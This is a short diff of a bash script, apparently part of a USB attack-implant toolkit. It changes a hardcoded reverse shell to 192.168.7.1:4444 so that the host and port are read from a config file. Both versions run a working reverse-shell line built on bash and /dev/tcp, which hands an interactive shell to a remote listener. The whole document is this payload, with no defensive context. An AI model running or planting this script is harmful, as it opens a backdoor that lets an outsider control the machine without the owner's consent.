@@ -1,4 +1,9 @@
 #!/bin/bash
-# Sends a reverse shell to host over USB Ethernet (host: 192.168.7.1:4444)
 
-bash -i >& /dev/tcp/192.168.7.1/4444 0>&1
+CONFIG="/opt/p4wnp1-o2/config/reverse_shell.conf"
+[ -f "$CONFIG" ] && source "$CONFIG"
+
+HOST="${RS_HOST}"
+PORT="${RS_PORT}"
+
+bash -i >& /dev/tcp/${HOST}/${PORT} 0>&1
